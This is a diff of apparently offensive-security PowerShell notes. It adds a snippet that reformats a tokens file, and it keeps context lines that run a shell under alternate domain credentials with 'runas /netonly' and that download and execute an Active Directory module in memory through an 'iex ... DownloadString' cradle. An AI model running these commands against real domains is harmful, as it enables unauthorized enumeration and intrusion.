@@ -1,3 +1,8 @@
+(Get-Content .\tokens.txt -Raw) `
+  -replace "`r?`n\s+", "" `
+  -replace "(?m)^([a-z_]+)\s*:\s*", "`n`$1 : " |
+  Set-Content .\tokens_singleline.txt
+
 runas /netonly /user:DOMAIN\retest powershell.exe
 
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
